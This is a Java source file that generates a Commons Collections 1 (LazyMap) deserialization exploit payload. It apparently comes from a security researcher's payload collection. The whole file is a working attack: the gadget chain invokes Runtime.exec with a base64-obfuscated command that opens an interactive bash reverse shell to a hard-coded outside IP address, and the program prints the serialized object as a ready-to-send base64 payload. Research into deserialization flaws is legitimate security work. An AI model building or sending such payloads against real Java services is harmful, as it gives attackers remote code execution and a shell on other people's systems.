package cn.hungslabsec.playloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC1_LazyMap {
    public static void main(String[] args) throws Exception{

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuMTcxLjIwMy84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazymap = LazyMap.decorate(map,chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class);
        AnnotationInvocationHandlerConstructor.setAccessible(true);
        InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap);

        Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h);

        Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap);

        ByteArrayOutputStream b = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(b);
        oos.writeObject(o);
        String payload = Base64.getEncoder().encodeToString(b.toByteArray());
        System.out.println(payload);
    }
}